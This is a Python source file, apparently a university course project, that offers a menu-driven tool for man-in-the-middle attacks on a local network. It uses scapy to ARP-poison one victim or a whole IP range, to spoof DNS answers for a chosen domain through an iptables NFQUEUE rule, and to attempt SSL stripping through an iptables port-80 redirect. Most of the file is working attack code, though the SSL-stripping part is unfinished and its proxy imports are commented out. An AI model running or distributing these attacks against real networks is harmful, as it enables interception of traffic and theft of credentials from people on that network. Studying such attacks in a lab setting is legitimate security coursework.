import sys, os, argparse
from util import bcolors, clear, parse_ip_input, validate_domain
import random
from scapy.all import *
from scapy.all import (
    sendp,
    Ether,
    IP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
    ARP,
    getmacbyip,
    send,
    sniff,
    TCP,
    Raw,
)
import time
import threading
import re
import urllib
from functools import partial
import netfilterqueue

# from mitmproxy import controller, proxy, options

# Global variables
dns_ip = ""
dns_domain = ""


# The name of the network interface to use for sniffing and sending packets
RUNINGTHREAD = False
NET_INTERFACE = "enp0s8"
ATTACKS = {
    "a": "ARP poisoning",
    "b": "DNS spoofing",
    "c": "SSL stripping",
    "d": "Address Mapping",
}


# Set up argument parser for using arguments in the command line
parser = argparse.ArgumentParser(
    prog="2IC80 tool",
    description="A tool for ARP poising, DNS spoofing and SSL stripping.",
    epilog="There are no arguments, please use the menu provided when running the tool. Good luck!",
)


def spoof(target_ip, spoof_ip, verbose=True):
    packet = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)

    if verbose:
        print(getmacbyip(target_ip))

    send(packet, verbose=False)


def ARPposioning():
    ip_attacker = custom_input("Enter IP address of attacker: ")
    mac_attacker = getmacbyip(ip_attacker)

    victimNumber = custom_input("Do you want to spoof one or multiple victims? (1/m)")
    if victimNumber == "1":
        ipVictim = custom_input("Enter IP address of victim: ")
        macVictim = getmacbyip(ipVictim)

        ipToSpoof = custom_input("Enter IP address to spoof: ")
        print(ipVictim)
        spoof(ipVictim, ipToSpoof)

        print("\n\n")

    elif victimNumber == "m":
        IPrange = custom_input("What is the range of IP addresses? ")
        ipToSpoof = custom_input("What is the IP address to spoof? ")

        if "-" in IPrange:
            upperBoundary = IPrange.split("-")[1]
            lowerBoundary = IPrange.split(".")[3].split("-")[0]

            for i in range(int(lowerBoundary), int(upperBoundary) + 1):
                ipVictim = (
                    IPrange.split(".")[0]
                    + "."
                    + IPrange.split(".")[1]
                    + "."
                    + IPrange.split(".")[2]
                    + "."
                    + str(i)
                )

                spoof(ipVictim, ipToSpoof)

        else:
            print("Invalid input. Please try again.")

        print("\n\n")

    print(
        "{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n".format(
            cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
        )
    )


def request_input(type, msg, count, invalid_msg, invalid_count_msg):
    output = None
    while not output:
        output = custom_input(msg)
        if type == "ip":
            output = parse_ip_input(output)
        elif type == "domain":
            output = validate_domain(output)
        else:
            output = None

        if len(output) != count:
            output = None
            print(invalid_count_msg)
        
        if not output:
            print(invalid_msg)
        
    return output


def DNSpoisoning():
    global dns_ip
    global dns_domain

    ip_victim = ""
    ip_gateway = ""

    # Make sure IP forwarding is enabled
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Set up iptables rule to trap outgoing packets in a queue
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Ask for a domain until a valid one is provided
    while not dns_domain:
        dns_domain_input = custom_input("Enter the domain name to spoof: ")
        dns_domain_valid = validate_domain(dns_domain_input)

        if dns_domain_valid:
            dns_domain = dns_domain_input
        else:
            print("{warning}Please enter a valid domain (format: www.example.com){endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))

    # Ask for an IP to resolve the given domain to until a valid one is provided
    while not dns_ip:
        dns_ip_input = custom_input("Enter the IP address to redirect the spoofed domain name to: ")
        dns_ip_parsed = parse_ip_input(dns_ip_input)

        if len(dns_ip_parsed) == 1:
            dns_ip = dns_ip_parsed[0]
        else:
            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))

    # Ask for the IP of the victim until a valid one is provided
    while not ip_victim:
        ip_victim_input = custom_input("Enter the IP of the victim u chose: ")
        ip_victim_parsed = parse_ip_input(ip_victim_input)

        if len(ip_victim_parsed) == 1:
            ip_victim = ip_victim_parsed[0]
        else:
            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
        
    # Ask for the IP of the gateway until a valid one is provided
    while not ip_gateway:
        ip_gateway_input = custom_input("Enter the IP of the gateway: ")
        ip_gateway_parsed = parse_ip_input(ip_gateway_input)

        if len(ip_gateway_parsed) == 1:
            ip_gateway = ip_gateway_parsed[0]
        else:
            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))

    # Start up a thread spoofing every 4 seconds
    interval = 4
    arp_spoof_thread = threading.Thread(target=arp_spoof_continuously, args=(ip_gateway, ip_victim, interval))
    arp_spoof_thread.daemon = True
    arp_spoof_thread.start()

    # Start up the netfilterqueue in a separate thread
    queue_thread = threading.Thread(target=netfilter_queue)
    queue_thread.daemon = True
    queue_thread.start()

    print(
        "\n{cyan}{attack}{endc} has been executed (set up background service which'll resolve {cyan}{domain}{endc} to {cyan}{ip}{endc} for the victim)\n".format(
            cyan=bcolors.OKCYAN,
            attack=ATTACKS["b"],
            endc=bcolors.ENDC,
            domain=dns_domain,
            ip=dns_ip,
        )
    )


def arp_spoof_continuously(ip_gate, ip_victim, interval):
    while True:
        spoof(ip_gate, ip_victim, verbose=False)
        spoof(ip_victim, ip_gate, verbose=False)
        time.sleep(interval)


def netfilter_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname

        if dns_domain in qname.decode():
            print("[+] Spoofing target")
            answer = DNSRR(rrname=qname, rdata=dns_ip)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()



def SSLstripping():
    """
    Function for executing the SSL stripping attack.

    This function starts off by spoofing the gateway and the victim. Then, it starts a proxy server
    using MITMProxy. The proxy server will intercept all HTTP requests and responses. This interception
    allows us to downgrade the HTTPS responses to HTTP responses and execute an SSL stripping attack.

    To route all traffic through the proxy, we use the IPTABLES command to redirect all traffic to port 80
    to port 8080. This is required because the proxy server is running on port 8080.
    """

    ip_gateway = ""
    ip_victim = ""

    # Ask for the IP of the gateway until a valid one is provided
    while not ip_gateway:
        ip_gateway_input = custom_input("Enter the IP of the gateway: ")
        ip_gateway_parsed = parse_ip_input(ip_gateway_input)

        if len(ip_gateway_parsed) == 1:
            ip_gateway = ip_gateway_parsed[0]
        else:
            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
    
    # Ask for the IP of the victim until a valid one is provided
    while not ip_victim:
        ip_victim_input = custom_input("Enter the IP of the victim: ")
        ip_victim_parsed = parse_ip_input(ip_victim_input)

        if len(ip_victim_parsed) == 1:
            ip_victim = ip_victim_parsed[0]
        else:
            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))

    spoof(ip_gateway, ip_victim)
    spoof(ip_victim, ip_gateway)

    # Run the proxy in a new thread
    proxy_thread = threading.Thread(target=run_proxy, args=("localhost", 8080))
    proxy_thread.daemon = True
    proxy_thread.start()

    # Run the IPTABLES command to redirect traffic to the proxy
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")

    # Run the SSL stripping attack using Scapy only instead of using MITMProxy, IPTABLES and the SSLStrip tool. Build it from scratch.
    # Concept:
    # 1. Sniff for HTTP requests
    # 2. When received, modify the request headers and forward the request to the server
    # 3. Sniff for HTTP responses
    # 4. When received, modify the response headers, strip the links and secure tags in the response body and forward the response to the client

    # Set of SSL/TLS capable hosts
    # secure_hosts = set()

    # Transform the request and response functions above into Scapy code
    def request(packet):
        print('Sniffed a TCP packet')
        print(packet.summary())
        print('Packet has TCP: {has_tcp}, has raw: {has_raw}, TCP destination port: {tcp_dport}'.format(
            has_tcp=packet.haslayer(TCP), has_raw=packet.haslayer(Raw), tcp_dport=packet[TCP].dport))
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
            print(packet[TCP].payload)

    def response(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
            print(packet[TCP].payload)

    # # Sniff for HTTP requests in a new thread
    # ssl_strip_thread = threading.Thread(target=ssl_strip_sniffing, args=(request, response))
    # ssl_strip_thread.daemon = True
    # ssl_strip_thread.start()

    print("\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
        cyan=bcolors.OKCYAN,
        attack=ATTACKS["c"],
        endc=bcolors.ENDC,
    ))


def ssl_strip_sniffing(request, response):
    sniff(filter="tcp port 80", prn=request, store=0, iface=NET_INTERFACE, count=1)


class RequestLogger:
    def request(self, flow):
        print(flow.request)


def run_proxy(host, port):
    # Start an MITM proxy server + master in Python 2.7 (mitmproxy version 0.18.2)
    opts = options.Options(mode="transparent")
    c = proxy.config.ProxyConfig(opts)
    s = proxy.server.ProxyServer(config=c)
    m = controller.Master(opts, s)

    try:
        m.run()
    except KeyboardInterrupt:
        m.shutdown()

    # Set of SSL/TLS capable hosts
    # secure_hosts = set()


def scan_ip(network, iface):
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    arp_request_broadcast = broadcast / arp_request  # Combined Packet

    answered = srp(arp_request_broadcast, timeout=2, iface=iface, verbose=False)[0]

    # Print the IP and MAC addresses of all the devices on the network.
    print(
        "\033[1m"
        + "  Here are the active devices on the "
        + iface
        + " interface"
        + "\033[0m"
    )
    for sent, received in answered:
        print("  IP: " + received.psrc + " - MAC: " + received.hwsrc)
    print("\n")


def mapAddresses():
    print("  We shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n")
    scan_ip("10.0.2.0/24", "enp0s8")
    scan_ip("192.168.56.1/24", "enp0s3")


def main():
    clear()
    print("2IC80: Tool by G44")
    while True:
        print("Select the preferred attack from the list below:\n")

        print("    {cyan}a{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC))
        print("    {cyan}b{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["b"], endc=bcolors.ENDC))
        print("    {cyan}c{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["c"], endc=bcolors.ENDC))
        print("    {cyan}d{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["d"], endc=bcolors.ENDC))
        print("    {cyan}e{endc}) Exit\n".format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC))

        choice = custom_input("\nYour choice: ")
        selectedName = choice
        
        if choice in ATTACKS:
            selectedName = ATTACKS[choice]
        elif choice == "e":
            selectedName = "Exit"
        
        print("You have selected {cyan}{name}{endc}. \n".format(cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC))

        if choice == "e":
            # Remove potential IP tables redirects
            try:
                os.system(
                    "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080"
                )
            except:
                pass

            try:
                os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
            except:
                pass

            break
        elif choice == "a":
            ARPposioning()
        elif choice == "b":
            DNSpoisoning()
        elif choice == "c":
            SSLstripping()
        elif choice == "d":
            mapAddresses()
        else:
            print("Invalid input. Please try again.\n")


def custom_input(msg):
    inp = raw_input(msg + bcolors.OKCYAN)
    sys.stdout.write(bcolors.ENDC)
    return inp


# Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
if __name__ == "__main__":
    parser.parse_args()
    main()
